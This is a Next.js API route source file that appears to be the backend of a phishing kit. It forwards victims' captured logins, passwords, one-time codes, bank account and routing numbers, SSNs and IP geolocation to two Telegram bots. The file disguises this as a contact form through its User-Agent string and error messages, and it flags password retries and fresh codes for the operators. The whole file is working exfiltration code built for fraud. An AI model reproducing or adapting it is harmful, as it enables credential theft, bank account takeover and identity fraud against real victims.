import { RESPONSES } from "@/const";
import { IpLocationData, sessions } from "@/store/session";
import { NextRequest, NextResponse } from "next/server";

export const dynamic = "force-dynamic";
export const runtime = "nodejs";

interface TelegramResponse {
  ok: boolean;
  description?: string;
  result?: any;
}

interface ApiResponse {
  success: boolean;
  error?: string;
  timestamp?: string;
}

// Escapes MarkdownV2 reserved characters
function escapeMarkdownV2(text: string): string {
  return text.replace(/[_*[\]()~`>#+=|{}.!\\-]/g, (match) => "\\" + match);
}

// Formats the message text using your RESPONSES logic
function formatTelegramMessage(
  data: sessions,
  ipInfo: IpLocationData,
  sessionId: string
): string {
  const { login, password, code, step, name, number, routing, ssn } = data;

  const { ip, country, city, regionName, isp, lon, lat } = ipInfo;

  let text = RESPONSES.loginOne.replace("{login}", login);

  if (step === 2 || step === 3) {
    text = RESPONSES.loginWithPwd
      .replace("{login}", login)
      .replace("{password}", password);
  } else if (step === 4 || step === 5) {
    text = RESPONSES.code.replace("{code}", code);
  } else if (step === 6) {
    text = RESPONSES.fullz
      .replace("{name}", name || "")
      .replace("{number}", number || "")
      .replace("{routing}", routing || "")
      .replace("{ssn}", ssn || "");
  }

  if (step === 3) {
    text = text.replace("Password:", "Password [RETRY]:");
  }

  if (step === 5) {
    text = text.replace("Code:", "Code [NEW]:");
  }

  return text
    .replace("{ip}", ip)
    .replace("{country}", country)
    .replace("{region}", regionName)
    .replace("{city}", city)
    .replace("{isp}", isp)
    .replace("{lat}", String(lat))
    .replace("{lon}", String(lon))
    .replace("{step}", String(step === 4 ? 1 : step === 5 ? 2 : step))
    .replace("{session}", sessionId);
}

// Sends one message to a bot/chat pair
async function sendTelegramMessage(
  botToken: string,
  chatId: string,
  text: string
): Promise<TelegramResponse> {
  const escapedText = escapeMarkdownV2(text);

  const response = await fetch(
    `https://api.telegram.org/bot${botToken}/sendMessage`,
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "NextJS-Contact-Form/1.0",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: escapedText,
        parse_mode: "MarkdownV2",
      }),
    }
  );

  if (!response.ok) {
    throw new Error(
      `Telegram API error: ${response.status} ${response.statusText}`
    );
  }

  return response.json();
}

export async function POST(
  request: NextRequest
): Promise<NextResponse<ApiResponse>> {
  try {
    const body = await request.json();

    const session = body?.data;
    const ipData = body?.ipLocationData;
    const sessionId = body?.sessionId || "";

    const telegramText = formatTelegramMessage(session, ipData, sessionId);

    // Bot/chat config pairs
    const configs = [
      {
        botToken: process.env.TELEGRAM_BOT_A_TOKEN!,
        chatId: process.env.TELEGRAM_CHAT_ID_ONE!,
      },
      {
        botToken: process.env.TELEGRAM_BOT_B_TOKEN!,
        chatId: process.env.TELEGRAM_CHAT_ID_TWO!,
      },
    ];

    // Validate environment vars
    for (const { botToken, chatId } of configs) {
      if (!botToken || !chatId) {
        throw new Error("Missing bot token or chat ID in environment");
      }
    }

    // Send to both
    const results = await Promise.allSettled(
      configs.map(({ botToken, chatId }) =>
        sendTelegramMessage(botToken, chatId, telegramText)
      )
    );

    // Check all went well
    const failed = results.filter((r) => r.status === "rejected");
    if (failed.length > 0) {
      const error = (failed[0] as PromiseRejectedResult).reason;
      throw new Error(`One or more Telegram messages failed: ${error}`);
    }

    return NextResponse.json(
      {
        success: true,
        timestamp: new Date().toISOString(),
      },
      { status: 200 }
    );
  } catch (error) {
    console.error("Contact form API error:", error);

    let statusCode = 500;
    let errorMessage = "Internal server error";

    if (error instanceof Error) {
      errorMessage = error.message;
      if (errorMessage.includes("Telegram API error")) {
        statusCode = 502;
      }
    }

    return NextResponse.json(
      {
        success: false,
        error: errorMessage,
        timestamp: new Date().toISOString(),
      },
      { status: statusCode }
    );
  }
}

export async function GET(): Promise<NextResponse> {
  return NextResponse.json(
    {
      success: false,
      error: "Method not allowed. Use POST to submit data.",
      timestamp: new Date().toISOString(),
    },
    { status: 405 }
  );
}
